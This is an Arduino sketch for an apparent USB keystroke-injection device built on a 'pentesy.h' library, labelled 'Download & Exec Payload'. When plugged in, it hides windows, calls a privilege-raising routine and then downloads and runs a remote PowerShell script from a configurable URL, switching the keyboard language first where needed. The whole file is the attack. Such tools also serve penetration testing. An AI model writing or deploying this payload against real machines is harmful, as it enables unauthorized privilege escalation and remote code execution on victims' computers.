#include "pentesy.h"

// Download & Exec Payload
// URL powershell script file
String URL = "";


void setup()
{
    pinMode(ledPin, OUTPUT);
    delay(1000);
    ledBlink(4,80);

    isOnCapsLock() ? pushAndPopKey(0, KEY_CAPS_LOCK, 300) : delay(100);
    isOnNumLock() ? pushAndPopKey(0, KEY_NUM_LOCK, 300) : delay(100);

    minimizeWindows(true);

    raisingPrivileges();

    if (isEngInput()) {
        pushAndPopKey(0, KEY_NUM_LOCK, 300);
        downloadAndExec(URL);
    }
    else{
        closeError();
        changeLanguage();
        raisingPrivileges();
        downloadAndExec(URL);
    }
    minimizeWindows(false);
    popKey(200);
}


void loop() {}
